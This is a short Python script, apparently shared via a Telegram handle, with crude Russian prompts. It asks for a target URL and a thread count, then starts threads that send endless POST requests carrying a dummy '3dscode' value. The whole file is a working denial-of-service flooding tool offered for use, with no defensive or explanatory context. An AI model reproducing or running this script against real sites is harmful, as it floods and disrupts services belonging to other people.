# Telegram @xdivv
import colorama
import threading
import requests
import cloudscraper

def dos(target):
    while True:
        try:
            res = requests.post(url, data={'3dscode': '666666', })
            print("Код выслан")
        except requests.exceptions.ConnectionError:
            print("Cука пиздец гг")

threads = 20

url = input("Вставь ссылОчку ")

try:
    threads = int(input("Сколько потоков ебанем (только расчитывай на возможности своего кампухтера и инета): "))
except ValueError:
    exit("ты дебил")

if threads == 0:
    exit("блять еблан")

if not url.__contains__("http"):
    exit("блять напиши домен фулл")

if not url.__contains__("."):
    exit("еблан домен не тот")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " потоков запущено!")